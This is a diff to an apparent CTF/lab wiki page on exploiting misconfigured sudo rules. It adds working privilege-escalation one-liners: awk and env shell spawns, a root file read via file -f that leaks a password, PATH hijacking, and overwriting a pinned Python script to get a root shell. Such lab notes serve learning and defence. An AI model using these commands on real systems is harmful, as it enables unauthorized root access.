@@ -40,7 +40,14 @@ Exploiting misconfigured `sudo` permissions to escalate privileges.
 - `(ALL) NOPASSWD: ALL` → `sudo -u root /bin/bash -p` — unrestricted sudo still deserves a `sudo -l` check; there is nothing to abuse, just run the payload directly ([[analyst]]).
 - `(ALL : ALL) /usr/bin/file` → **arbitrary root file read**, not a shell: `sudo -u root /usr/bin/file -f /opt/password.txt` treats each line of the file as a filename and echoes it back in the error output (``root:rooteable2: cannot open …``) → root's password → `su root` ([[dance-samba]], [[gtfobins]]). GTFOBins has a *file-read* section too — check it even when the binary can't spawn a shell.
 - `(norberto) NOPASSWD: /usr/bin/baner` → a **custom** binary (not in GTFOBins) that runs `head` by *name*: absolute path first, then relative — so the payload is a [[path-hijacking]] (`PATH=/tmp:$PATH` + `/tmp/head`), not a GTFOBins one-liner. When the binary's own output says it's calling something relatively, it's telling you the vulnerability ([[rutas]]).
+- `(julen) NOPASSWD: /usr/bin/awk` → `sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/sh")}'` → shell as `julen` ([[file]]).
+- `(iker) NOPASSWD: /usr/bin/env` → `sudo -u iker /usr/bin/env /bin/bash` → shell as `iker` ([[file]]).
+- `(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py` → the command line is **pinned**, so you can't touch the arguments — overwrite the *script* it runs with `import os; os.execl("/bin/sh", "sh")` → root ([[file]], same shape as [[nodeclimb]]/[[psycho]]: when the payload must be an argument you can't change, move it into the file the command reads).
+
+## Re-run `sudo -l` after every hop
+
+The entry you need is usually on the account you *just became*, not the one you started with. [[file]] carried three rules on three different users — `awk` on mario, `env` on julen, `python3` on iker — so `sudo -l` after each `su` was what revealed the next step. A single `sudo -l` at the foothold reads as "nothing useful" on a box like this.
 
 ## Seen in
 
-[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]], [[rutas]]
+[[hedgehog]], [[trust]], [[obsession]], [[vacaciones]], [[borazuwara]], [[simple-ctf]], [[hannah-coffee]], [[balulero]], [[nodeclimb]], [[psycho]], [[anonymous-pingu]], [[bruteshock]], [[littlepivoting]], [[madeyes-castle]], [[flynn]], [[analyst]], [[dance-samba]], [[rutas]], [[file]]
